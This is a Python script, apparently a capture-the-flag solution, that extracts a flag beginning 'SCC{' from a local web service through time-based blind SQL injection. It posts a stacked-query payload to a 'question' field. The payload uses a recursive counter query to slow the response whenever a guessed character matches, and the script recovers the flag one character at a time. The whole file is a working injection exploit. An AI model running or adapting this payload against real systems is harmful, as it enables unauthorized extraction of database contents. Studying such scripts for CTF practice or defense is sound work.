import requests
import time

target_url = "http://localhost:3000"

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_}"

prefix = "SCC{"
delay_threshold = 1

while True:
    found_char = False
    for ch in alphabet:
        injection = (
            "');PRAGMA case_sensitive_like = ON;SELECT CASE WHEN EXISTS("
            "SELECT 1 FROM questions WHERE question LIKE '{}\{}%' ESCAPE '\\') "
            "THEN (SELECT count(*) FROM (WITH RECURSIVE counter(x) AS "
            "(SELECT 1 UNION ALL SELECT x+1 FROM counter LIMIT 10000000) "
            "SELECT count(*) FROM counter)) ELSE 1 END;--"
        ).format(prefix, ch)

        data = {"question": injection}
        start_time = time.time()
        try:
            response = requests.post(target_url, data=data)
        except Exception as e:
            print("Request error:", e)
            continue
        elapsed = time.time() - start_time

        print(f"Trying '{prefix}{ch}' -> response time: {elapsed:.2f} sec")
        if elapsed > delay_threshold:
            prefix += ch
            print(f"new prefix is '{prefix}'")
            found_char = True
            break

    if not found_char:
        break

print("Final flag:", prefix)
